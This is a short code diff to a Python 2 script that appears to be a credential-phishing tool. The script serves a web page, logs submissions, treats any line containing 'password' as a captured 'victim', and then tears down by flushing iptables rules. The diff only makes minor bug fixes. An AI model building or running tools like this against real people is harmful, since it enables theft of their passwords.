@@ -151,8 +151,7 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     def do_GET(self):
 
         if not os.path.isfile(CONFIG):
-            sys.exit()
-            stop_server()
+            shutdown()
         d = config_section_map("Router")
 
         if self.path == "/":
@@ -177,6 +176,7 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
             # Send file content to client
             self.wfile.write(s)
             f.close()
+            return
         # Leave binary and other data to default handler.
         else:
             SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
@@ -239,7 +239,6 @@ def shutdown():
     """
     Shutdowns program.
     """
-    stop_server()
     os.system('iptables -F')
     os.system('iptables -X')
     os.system('iptables -t nat -F')
@@ -831,7 +830,7 @@ if __name__ == "__main__":
                 print l
                 # We got a victim. Shutdown everything.
                 if "password" in l:
-                    time.sleep(1)
+                    time.sleep(2)
                     shutdown()
             time.sleep(0.5)
     except KeyboardInterrupt:
